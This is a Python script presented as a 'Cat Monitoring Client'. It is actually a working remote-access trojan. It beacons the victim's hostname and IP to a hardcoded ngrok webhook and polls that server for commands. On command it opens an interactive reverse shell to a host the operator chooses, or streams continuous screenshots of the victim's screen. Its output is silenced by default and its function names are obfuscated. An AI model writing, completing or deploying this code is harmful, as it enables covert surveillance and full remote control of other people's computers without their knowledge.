import argparse
import socket
import sys
import threading
import time
import os
import subprocess
import json
import base64
from typing import Optional
from urllib import request as urlrequest,parse as urlparse,error as urlerror
g_cam_thread:Optional[threading.Thread]=None
g_cam_stop_event:Optional[threading.Event]=None
g_cam_cfg:Optional[dict]=None
g_cam_pending_until:float=0.0
g_mic_thread:Optional[threading.Thread]=None
g_mic_stop_event:Optional[threading.Event]=None
_g:Optional[threading.Thread]=None
_h:Optional[threading.Event]=None
_i:Optional[dict]=None
def parse_args():
    p=argparse.ArgumentParser(description="Cat Monitoring Client")
    p.add_argument("--webhook-url",default=None,help="Webhook base URL(e.g.,http://SERVER:8000/webhook)")
    p.add_argument("--name",default=None,help="Client name")
    p.add_argument("--show",action="store_true",help="Show debug output and terminal messages")
    return p.parse_args()
_o=False
def _q(*args,**kwargs):
    if _o:
        print(*args,**kwargs)
def _r()->str:
    try:
        return socket.gethostname()
    except Exception:
        return "unknown-host"
def _s()->str:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8",80))
            return s.getsockname()[0]
        finally:
            s.close()
    except Exception:
        return "0.0.0.0"
def _t():
    global _i,_h
    if not _i:
        _q("[screen]No screen config available")
        return
    _q("[screen]Screen capture thread started")
    try:
        from PIL import ImageGrab
        import io
    except ImportError:
        _q("[screen]PIL not found,installing Pillow...")
        try:
            import subprocess
            import sys
            subprocess.check_call([sys.executable,"-m","pip","install","Pillow","--quiet"])
            _q("[screen]Pillow installed successfully")
            from PIL import ImageGrab
            import io
            _q("[screen]PIL imported successfully after installation")
        except subprocess.CalledProcessError as e:
            print(f"[ERROR]Failed to install Pillow:{e}")
            print("[ERROR]Please install manually:pip install Pillow")
            return
        except ImportError:
            print("[ERROR]Failed to import PIL even after installation")
            print("[ERROR]Please install manually:pip install Pillow")
            return
        except Exception as e:
            print(f"[ERROR]Unexpected error during Pillow installation:{e}")
            return
    name=_i["name"]
    ip=_i["ip"]
    wb=_i["wb"]
    delay=_i["delay"]
    base=wb
    if base.rstrip("/").endswith("webhook"):
        base=base.rsplit("/",1)[0]
    upload_url=f"{base.rstrip('/')}/api/screen/frame_bin"
    fc=0
    while not _h.is_set():
        try:
            screenshot=ImageGrab.grab()
            buffer=io.BytesIO()
            screenshot.save(buffer,format='JPEG',quality=80,optimize=True)
            fd=buffer.getvalue()
            boundary=f"----formdata-{int(time.time()*1000)}"
            form_data=[]
            form_data.append(f"--{boundary}")
            form_data.append('Content-Disposition:form-data;name="name"')
            form_data.append("")
            form_data.append(name)
            form_data.append(f"--{boundary}")
            form_data.append('Content-Disposition:form-data;name="ip"')
            form_data.append("")
            form_data.append(ip)
            form_data.append(f"--{boundary}")
            form_data.append('Content-Disposition:form-data;name="frame";filename="screen.jpg"')
            form_data.append("Content-Type:image/jpeg")
            form_data.append("")
            form_text="\r\n".join(form_data)+"\r\n"
            form_end=f"\r\n--{boundary}--\r\n"
            body=form_text.encode('utf-8')+fd+form_end.encode('utf-8')
            req=urlrequest.Request(
                upload_url,
                data=body,
                headers={
                    "Content-Type":f"multipart/form-data;boundary={boundary}",
                    "Content-Length":str(len(body))
                },
                method="POST"
            )
            with urlrequest.urlopen(req,timeout=10)as resp:
                result=resp.read()
            fc+=1
            if fc % 50==0:
                _q(f"[screen]Sent{fc}frames({len(fd)}bytes)")
        except Exception as e:
            if not _h.is_set():
                _q(f"[screen]Frame upload error:{e}")
        if not _h.wait(delay):
            continue
        else:
            break
    _q(f"[screen]Screen capture stopped after{fc}frames")
def _u(host:str,port:int):
    _q(f"[nc]Opening shell session to{host}:{port}")
    try:
        import subprocess as _sp
        shell_cmd=["cmd.exe"]if os.name=="nt" else["/bin/sh","-i"]
        sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.connect((host,port))
        sock.settimeout(1.0)
        proc=_sp.Popen(shell_cmd,stdin=_sp.PIPE,stdout=_sp.PIPE,stderr=_sp.STDOUT,bufsize=0)
        stop=threading.Event()
        def pump_stdout():
            try:
                while not stop.is_set():
                    data=proc.stdout.read(1)
                    if not data:
                        break
                    try:
                        sock.sendall(data)
                    except Exception:
                        break
            finally:
                stop.set()
        def pump_stdin():
            try:
                while not stop.is_set():
                    try:
                        data=sock.recv(4096)
                        if not data:
                            break
                        proc.stdin.write(data)
                        proc.stdin.flush()
                    except socket.timeout:
                        continue
                    except Exception:
                        break
            finally:
                stop.set()
        t1=threading.Thread(target=pump_stdout,daemon=True)
        t2=threading.Thread(target=pump_stdin,daemon=True)
        t1.start();t2.start()
        while not stop.is_set():
            if proc.poll()is not None:
                break
            time.sleep(0.2)
    finally:
        try:
            stop.set()
            proc.terminate()
            sock.close()
        except:
            pass
if __name__=="__main__":
    args=parse_args()
    _o=args.show
    name=args.name or os.getenv("USERNAME")or _r()
    ip=_s()
    wb=args.webhook_url or "https://ad1f8ae9fc13.ngrok-free.app/webhook"
    _q(f"[i]Cat monitoring client:name={name}ip={ip}")
    def webhook_ping():
        try:
            if not wb:
                return
            params={
                "event":"heartbeat",
                "name":name,
                "ip":ip,
            }
            query=urlparse.urlencode(params)
            if wb.endswith("/webhook"):
                full=f"{wb}?{query}"
            else:
                full=f"{wb.rstrip('/')}/webhook?{query}"
            _q(f"[debug]Webhook ping to:{full}")
            req=urlrequest.Request(full,method="GET")
            with urlrequest.urlopen(req,timeout=3)as resp:
                result=resp.read(100)
                _q(f"[debug]Webhook response:{resp.status}")
        except Exception as e:
            _q(f"[debug]Webhook ping failed:{e}")
    def poll_commands():
        if not wb:
            return None,{}
        try:
            base=wb
            if base.rstrip("/").endswith("webhook"):
                base=base.rsplit("/",1)[0]
            url=f"{base.rstrip('/')}/api/cmd/next?name={urlparse.quote(name)}&ip={urlparse.quote(ip)}"
            _q(f"[debug]Polling commands from:{url}")
            with urlrequest.urlopen(url,timeout=5)as resp:
                response_text=resp.read().decode("utf-8",errors="ignore")or "{}"
                obj=json.loads(response_text)
                cmd=obj.get("cmd")
                args=obj.get("args")or{}
                if cmd:
                    _q(f"[cmd]Received:{cmd}")
                return(cmd,args)
        except Exception as e:
            _q(f"[debug]Command poll failed:{e}")
            return None,{}
    def heartbeat_loop():
        while True:
            webhook_ping()
            try:
                time.sleep(5)
            except KeyboardInterrupt:
                break
    threading.Thread(target=heartbeat_loop,daemon=True).start()
    try:
        while True:
            cmd,cargs=poll_commands()
            if cmd=="connect_nc":
                host=str(cargs.get("host","127.0.0.1"))
                port=int(cargs.get("port",2002))
                _q(f"[nc]Connecting to{host}:{port}")
                try:
                    _u(host,port)
                except Exception as e:
                    _q(f"[nc]Shell session failed:{e}")
            elif cmd=="screen_start":
                fps=int(cargs.get("fps",10))
                _q(f"[screen]Starting screen capture at{fps}FPS")
                if _g and _g.is_alive():
                    _q("[screen]Stopping existing screen capture")
                    if _h:
                        _h.set()
                    if _g:
                        _g.join(timeout=2)
                try:
                    globals()['_i']={
                        "fps":fps,
                        "delay":1.0/fps,
                        "name":name,
                        "ip":ip,
                        "wb":wb
                    }
                    globals()['_h']=threading.Event()
                    globals()['_g']=threading.Thread(target=_t,daemon=True)
                    _g.start()
                    _q(f"[screen]Screen capture started at{fps}FPS")
                except Exception as e:
                    _q(f"[screen]Failed to start screen capture:{e}")
            elif cmd=="screen_stop":
                _q("[screen]Stopping screen capture")
                try:
                    if _h:
                        _h.set()
                    if _g and _g.is_alive():
                        _g.join(timeout=3)
                    globals()['_g']=None
                    globals()['_h']=None
                    _q("[screen]Screen capture stopped")
                except Exception as e:
                    _q(f"[screen]Error stopping screen capture:{e}")
            time.sleep(3)
    except KeyboardInterrupt:
        _q("\n[!]Stopping client.")
